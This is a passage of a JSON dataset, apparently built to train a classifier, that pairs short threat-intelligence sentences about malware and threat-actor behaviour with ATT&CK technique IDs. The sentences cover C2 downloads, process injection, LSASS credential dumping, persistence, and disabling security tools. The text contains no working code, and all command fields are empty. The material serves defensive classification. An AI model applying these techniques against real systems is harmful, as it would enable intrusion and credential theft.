    "text": "has an integrated scripting engine to download and execute Lua scripts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "While it includes multiple ways to find Explorer, the preferred method is to get the process id from the current desktop window.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can perform reconnaissance commands on a victim machine via a cmd.exe process.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses a tool called CLEANTOAD that has the capability to modify Registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "a number of WMI requests via DCERPC from one endpoint to a target endpoint based on the ports.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "to disable remote administration restrictions to facilitate lateral movement and privilege escalation activities",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "with the API function IsWindowVisible.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can collect the computer name from the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has created scheduled tasks using name variants such as Windows Update Security Windows Update Security Patches and Google Chrome Security Update to launch  at a specific time.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Several  malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by  also gathers process times.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: McAfee GhostSecret)(Citation: TrendMicro macOS Dacls May 2020)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used Metasploit to perform reflective DLL injection in order to escalate privileges.(Citation: ESET Turla Mosquito May 2018)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Initial triage begins with connecting to Windows Management Instrumentation (WMI) via the “ROOT\\CIMV2” namespace",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "uses reg add to add a Registry Run key for persistence.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor succeeded in authenticating into victim O365 tenants",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has sent malicious DOC and PDF files to targets so that they can be opened by a user.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "collects the system name OS version including service pack and system install date and sends the information to the C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can gather the hostname and the OS version to ensure it doesnt run on a Windows XP or Windows Server 2003 systems.(Citation: Talos ROKRAT)(Citation: Talos ROKRAT 2)(Citation: Securelist ScarCruft May 2019)(Citation: NCCGroup RokRat Nov 2018)(Citation: Volexity InkySquid RokRAT August 2021)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can use a variety of APIs for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Creating a WMI permanent event subscription",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can install encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll and HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "the attacker leveraging Windows Remote Desktop Connections to pivot to additional systems in the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can use `getmac` and `Get-NetIPAddress` to enumerate network settings.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has staged collected data files under C:\\Program Files\\Common Files\\System\\Ole DB\\.(Citation: CISA AA20-301A Kimsuky)",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "the configuration file will be deleted",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Usage of WMI for remote command execution",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can collect the name and ID for every process running on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "creates a shortcut file and saves it in a Startup folder to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has achieved execution through victims opening malicious attachments including MSI files with embedded VBScript.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The public IP is then POSTed along with OS Version, Internal IP, Machine Name, Domain Name, UserName after being encrypted to the previously chosen URL to register a new victim",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "finds a specified directory lists the files and metadata about those files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "command pulls down a Visual Basic script, drops it into the C:\\Windows\\Tasks folder, and executes it.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used RDP connections to move across the victim network.(Citation: PWC Cloud Hopper April 2017)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to run an application (CreateProcessW) or script/file (ShellExecuteW) via API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com freegeoip[.]net or api[.]ipify[.]org observed with user-agent string `Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0`.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "downloads and executes additional PowerShell code and Windows binaries.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate files and directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "injected code in a process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can download additional modules from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, this Trojan checks to see if it was configured with “BINDERON” to determine if it should extract an embedded payload from a resource named “B”, save it to %TEMP%\\%BIND1%, and create a new process with the embedded payload",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "OS version",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has deleted certain values from the Registry to load a malicious DLL. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "this is done via the popen API",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can use `rundll32.exe` to load DLL from the command line.(Citation: Cobalt Strike Manual 4.3 November 2020)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "directory listings",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "retrieving malware from C2",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has stored collected credential files in c:\\windows\\temp prior to exfiltration.  has also stored documents for exfiltration in a hidden folder on USB drives.(Citation: Secureworks BRONZE PRESIDENT December 2019)",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect data from a compromised host including Windows authentication information.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can download files off the target system to send back to the server.(Citation: Github Koadic)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can hook APIs kill processes break file system paths and change ACLs to prevent security tools from running.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "then proceeded to dump credentials from LSASS.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "used executables to download malicious files from different sources.(Citation: Kaspersky MoleRATs April 2019) ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "setup a Registry Run Key to maintain persistence on the beachhead host.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence by creating a new service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional executables following the initial infection stage.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has a command to delete its Registry key and scheduled task.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded code from a C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used Windows APIs including `GetKeyboardType` `NetUserAdd` and `NetUserDel`.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to contact actor-controlled C2 servers via HTTP.(Citation: Mandiant UNC3313 Feb 2022)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "attacker’s Kali Linux host to RDP into our target’s environment",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to achieve persistence by adding a new task in the task scheduler to run every minute.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Remote Command Line",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has run tasklist on a victim's machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "checks if the system is 64-bit",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional files and programs from its C2 server.(Citation: Symantec Elfin Mar 2019)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can launch interactive shells for communicating with the victim machine.(Citation: PWC KeyBoys Feb 2017)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has leveraged CreateProcessW() call to execute the debugger.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The second way to execute StealthMutant is through the creation of a scheduled task",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can delete specified files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence by running `sc.exe` and by setting the `WSearch` service to run automatically.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The low-level functions, directly related with performing the injection, are called via raw syscalls",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used remote desktop sessions for lateral movement.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "batch files for automation.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can query Windows\\CurrentVersion\\Uninstall for installed applications.(Citation: Cybereason Bazar July 2020)",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can search for specific file extensions including zipped files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "lists the command line arguments accepted",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can store copied files in a specific directory prior to exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can write to the Registry under the %windir% variable to execute tasks.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "discovers information about the infected machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "It collects the victim’s username",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "parses the export tables of system DLLs to locate and call various Windows API functions.(Citation: SecureList SynAck Doppelgnging May 2018)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The magic value 0xFEEDFACF that belongs to Mach-O Executable (64 bit) Methods GET_LAUNCHNAME and GET_LABELNAME will return the hardcoded name of the property list “.plist” for the root user (com.apple.screen.assistantd.plist) and for the regular user (com.apple.spell.agent.plist)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can remove files containing its payload after they are executed.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI to attempt to delete the shadow volumes on a machine and to connect a virtual machine to the network domain of the victim organization's network.(Citation: McAfee Maze March 2020) ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Then it enters a for loop iterating over the drive list to build a recursive directory listing",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can be used to discover processes running on a system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has delivered trojanized executables via spearphishing emails that contacts actor-controlled servers to download malicious payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can inject code into local and remote processes.(Citation: Bishop Fox Sliver Framework August 2019)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32.exe to execute other DLLs and named pipes. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has used  to get information on processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": " has executed malware by calling the API function `CreateProcessW`.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has monitored CPU usage.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe and batch scripts to execute commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can monitor processes for open browsers and custom banking applications.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can use the RegEnumKeyW to iterate through Registry keys. ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP and HTTPS for C2 communications.(Citation: ESET Turla Mosquito Jan 2018)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate files on the local file system and includes a module for enumerating recently accessed files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "This can be anything from file and directory-listings,",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has remote desktop functionality. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has used schtasks.exe for lateral movement in compromised networks.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can perform network reconnaissance using the Advanced IP Scanner tool.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Write text to a given *.bat file and execute it",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": ". The name of the created service, “SysmainUpdate”, is usurping the name of the legitimate service “SysMain” which is related to the legitimate DLL sysmain.dll and also to the Superfetch service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "After injecting into various processes on the host,",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This excellent whitepaper by William Ballenthin, Matt Graeber and Claudiu Teodorescu contains additional information on WMI offense, defense and forensics",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Before exfiltration, the attackers may put collected data in 7Zip archives.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "operating system version",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can launch an interface where it can execute several commands on the victims PC.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use  to list running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can collect data from the victim and stage it in LOCALAPPDATA%\\MicroSoft Updatea\\uplog.tmp.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "checks the system for certain Registry keys.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Additionally we see a cmd.exe process launched and used for process injection using the VirtualAlloc(), WriteProcessMemory() and CreateRemoteThread() Windows APIs, as with the first finding of ROKRAT they continue to use similar Windows APIs",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "the Windows Command Processor was used",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has added a Registry Run key to establish persistence.(Citation: Nccgroup Gh0st April 2018)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve usernames.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can create delete or modify a specified Registry key or value.(Citation: Fidelis njRAT June 2013)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has been executed via malicious MS Word e-mail attachments.(Citation: G Data Sodinokibi June 2019)(Citation: McAfee REvil October 2019)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "runs the ifconfig command to obtain the IP address from the victims machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve the username from a targeted system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to obtain a VBS script from command and control (C2) nodes over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "searches and reads the value of the Windows Update Registry Run key.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "ShellExecuteA is also used to launch",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "If the Trojan does not have root privileges to enable its automatic launch, it creates the “~/.config/autostart/dbus-inotifier.desktop” file with the following contents: [Desktop Entry] Type=Application Exec=/home/user/.config/dbus-notifier/dbus-inotifier Name[en_EN]=system service d-bus notifier Name=system service d-bus notifier Comment[en_EN]= Comment= “/home/user/” stands here for the environment variable HOME",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "create a reverse shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Shell\nExecute a specified command via CMD",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP for command and control communication.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has a command to delete a file.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "this code comparing the local IP address with a predefined list of network addresses",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to send system volume information to C2.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used macros to deliver malware such as  and .(Citation: FireEye APT34 Dec 2017)(Citation: OilRig ISMAgent July 2017)(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 QUADAGENT July 2018)  has used batch scripts.(Citation: FireEye APT34 Dec 2017)(Citation: OilRig ISMAgent July 2017)(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 QUADAGENT July 2018)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Disable the Windows firewall, using netsh.exe",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can use a Registry Run Key and the Startup folder to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has initiated connections to external domains using HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI queries to gather system information.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The dropper will delete itself at the end of the process",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The shellcode of the embedded object is designed to download an image, which is, in fact, a new shellcode used to decode an embedded executable",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can check the Registry for the presence of HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\last_edate to determine how long it has been installed on a host.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has stored collected data under `%<malware_execution_folder>%\\\\CrashLog.txt`.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has created payloads in the Startup directory to maintain persistence. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The injection\nprocess",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used previously compromised administrative accounts to escalate privileges.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can downloaded payloads from C2 to the compromised host.(Citation: FireEye NETWIRE March 2019)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to collect the MAC address of an infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has attempted and failed to run Bash commands on a Windows host by passing them to cmd /C.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor kept the remote desktop session alive",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect the user name of the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used a variety of Windows API functions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "(Source: Dell SecureWorks) Appendix D — Domain name parking example CTU researchers have observed TG-3390 parking domains by pointing their A record to a non-routable IP space, including the 127.0.0.[x] loopback address",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used  to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "This includes, but is not limited to, the following:  AES encryption of network communication File management Functionality to download, upload, and execute files Keylogging Remote desktop access Remote webcam viewing Reverse proxy Browser and FTP client password recovery  The images below are what a target user opening a malicious RTF document would see from within Microsoft Word",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses rundll32.exe to install itself on remote systems when accessed via  or wmic.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "To prevent being detected, the attackers end processes and services related to security and antivirus software.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "ran a command to compile an archive of file types of interest from the victim user's directories.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default on a victim to query the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has enumerated files and folders on all mounted drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can look for files carrying specific extensions such as: .rtf .doc .docx .xls .xlsx .ppt .pptx .pps .ppsx .txt .gpg .pkr .kdbx .key and .jpb.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used tracert to check internet connectivity.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "that registers a scheduled task which runs immediately and upon user logon,",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "cloud drive, or other cloud resources accessible by the compromised account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can collect information about a compromised computer including: Hardware UUID Mac serial number macOS version and disk sizes.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "collects the victim LAN IP address and sends it to the C2 server.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "looks for and attempts to stop anti-malware solutions.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can delete its dropper component from the targeted system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "acquired through the use of Mimikatz, or creating LSASS dumps,",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "searches victim drives for files matching certain extensions (.skr.pkr or .key) or names.(Citation: ESET Sednit USBStealer 2014)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has relied on users opening malicious attachments delivered through spearphishing to execute malware.(Citation: Cylance Machete Mar 2017)(Citation: Securelist Machete Aug 2014)(Citation: ESET Machete July 2019)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "collects the local IP address of the victim and sends it to the C2.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "may download additional files to execute.(Citation: Proofpoint TA505 Jan 2019)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collected the username from a compromised host.(Citation: FireEye SUNBURST Backdoor December 2020)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence via the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run and a shortcut within the startup folder.(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": ".iqy files are simple text files containing a URL which are opened by default by Excel",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "reg query",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "used  to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTPS in C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect data such as PowerPoint files Word documents Excel files PDF files text files database files and image files from an infected machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "and hostname",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional malware and tools onto a compromised host.(Citation: Cisco Talos Bitter Bangladesh May 2022) ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the folder included a legitimate copy of rundll32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can download additional malicious files from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collects the MAC address computer name and CPU information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "both use batch files that run via the Windows command shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can download files to targeted systems.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to communicate over HTTP.(Citation: Red Canary NETWIRE January 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "that contained various bat files,",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has dropped an executable file to the startup directory. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "using a batch file named find.bat.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and data scraped from memory.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "were observed using Microsoft signed binaries, such as Rundll32, as a proxy to execute malicious payloads.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can create Registry entries to enable services to run.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP for communication with its C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
